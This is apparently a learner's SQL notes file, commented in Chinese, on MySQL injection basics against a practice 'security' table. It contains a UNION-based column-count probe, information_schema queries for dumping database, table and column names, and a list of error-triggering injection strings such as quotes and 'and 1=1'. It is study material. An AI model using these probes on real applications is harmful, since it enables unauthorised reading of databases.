-- 获取数据库的版本
SELECT VERSION();

-- 获取登陆用户信息
SELECT USER();

-- 获取MySQL服务器所有数据库的信息库名information_schema
-- 该数据库包含数据库名、数据库表、表栏的数据类型与访问权限等
-- 这台 MySQL 服务器上，到底有哪些数据库，各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问等保存在information_schema里
SELECT DATABASE();

# INSERT INTO security.sql_injections(name, age, sex, tall, weight, address, phone, salary, friends)
# VALUES ('A', 23, 1, 123, 124, '地址A', 1321, 123, 'A1'),
#        ('B', 24, 0, 133, 134, '地址B', 1322, 124, 'B1');
-- limit 0, 1 等价于 limit 1
SELECT * FROM sql_injections;
SELECT * FROM sql_injections limit 0, 1;
SELECT * FROM sql_injections limit 1;

-- ORDER BY 1 表示 所select 的字段按第一个字段排序
-- ORDER BY 1 DESC 按第一个字段降序排序
-- ORDER BY 1 ASC 按第一个字段升序排序
SELECT * FROM sql_injections ORDER BY 1 DESC ;


-- 可以判断处要攻击表有几列
SELECT * FROM sql_injections WHERE id=2 UNION ALL SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10;

-- 爆库名：拿到mysql服务器上的所有库名
SELECT GROUP_CONCAT(schema_name) FROM information_schema.SCHEMATA;

-- 爆表名: 根据库表拿到我们想要的表名
SELECT GROUP_CONCAT(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security';

-- 爆列名
SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA='security'
    AND TABLE_NAME = 'sql_injections';

-- 注入报错常用字典
-- '
-- "
-- /
-- /*
-- #
--
-- )
-- (
-- )'
-- ('
-- and 1=1
-- and 1=2
-- and 1>2
-- and 1<2





